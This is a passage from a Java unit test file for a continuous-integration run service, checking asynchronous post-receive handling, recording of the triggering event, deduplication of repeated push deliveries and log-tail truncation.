  }

  @Test
  public void onPostReceiveExecutesAsynchronously() throws Exception {
    seedConfig(CONFIG_TWO_STEPS);
    service.onPostReceive(
        CiRepoRef.of(repoId), "main", "0".repeat(40), sha, UUID.randomUUID().toString());
    service.awaitIdle();
    assertEquals(CiRunStatus.SUCCESS, soleRun().status);
  }

  @Test
  public void theAnnouncingEventLandsOnTheRunSoTheAnnouncementCanBeCausedByIt() throws Exception {
    // CausingEvent turns this column into the published BuildSuccessful's parentId, on another
    // thread and possibly after a restart — so the row is the whole hand-off, and this is where it
    // is written. What the publish does with it is asserted in CiEventTriggerCausationTest.
    seedConfig(CONFIG_TWO_STEPS);
    String eventId = UUID.randomUUID().toString();
    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
    service.awaitIdle();

    CiRun run = soleRun();
    assertEquals(CiRunStatus.SUCCESS, run.status);
    assertEquals(eventId, run.triggerEventId);
    assertEquals(CiTriggerType.POST_RECEIVE, run.triggerType);
  }

  @Test
  public void oneAnnouncedPushIsOneRun() throws Exception {
    // The unique constraint on (trigger_event_id, repo_id, config_path) reaches pushes now. The
    // duplicate is SETTLED rather than thrown: a second delivery must not leave the push owed
    // forever over a run that already exists.
    seedConfig(CONFIG_TWO_STEPS);
    String eventId = UUID.randomUUID().toString();
    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
    service.onPostReceive(CiRepoRef.of(repoId), "main", "0".repeat(40), sha, eventId);
    service.awaitIdle();

    assertEquals(1, service.runsFor(repoId).size(), "one announcement, one run");
  }

  @Test
  public void tailKeepsTheEndAndMarksTheCut() {
    assertNull(CiRunService.tail(null, 10));
    assertEquals("short", CiRunService.tail("short", 10));
    assertEquals("exactlyten", CiRunService.tail("exactlyten", 10));
    String cut = CiRunService.tail("0123456789abcdef", 10);
    assertEquals(CiRunService.TRUNCATION_MARKER + "6789abcdef", cut);
  }
}
